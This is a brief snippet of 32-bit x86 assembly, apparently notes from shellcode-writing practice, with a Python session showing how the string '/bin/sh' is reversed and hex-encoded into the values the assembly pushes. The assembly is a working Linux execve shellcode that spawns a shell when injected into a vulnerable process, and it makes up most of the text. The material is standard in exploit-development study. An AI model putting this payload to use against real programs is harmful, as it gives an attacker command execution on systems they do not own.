xor eax,eax
add eax,0x0b
xor ecx,ecx
xor edx,edx
push edx
push 0x0068732f
push 0x6e69622f
mov ebx,esp
int 0x80


>>> import binascii
>>> "/bin/sh\0"[::-1]
'\x00hs/nib/'
>>> binascii.hexlify(b'\x00hs/nib/')
b'0068732f6e69622f'
